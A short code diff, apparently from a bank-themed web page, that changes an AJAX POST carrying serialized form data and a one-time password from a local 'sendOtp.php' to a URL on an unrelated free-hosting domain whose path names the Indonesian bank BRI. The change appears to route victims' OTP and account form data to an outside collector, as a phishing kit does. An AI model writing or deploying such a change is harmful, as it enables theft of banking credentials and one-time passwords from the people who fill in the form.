@@ -463,7 +463,7 @@ document.getElementById("saldoku").value = saldo + "";
 $.ajax({
 
  type: 'POST',
- url: 'sendOtp.php',
+ url: 'https://kementrian-daerah.c1.is/database/BRI/5/sendOtp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
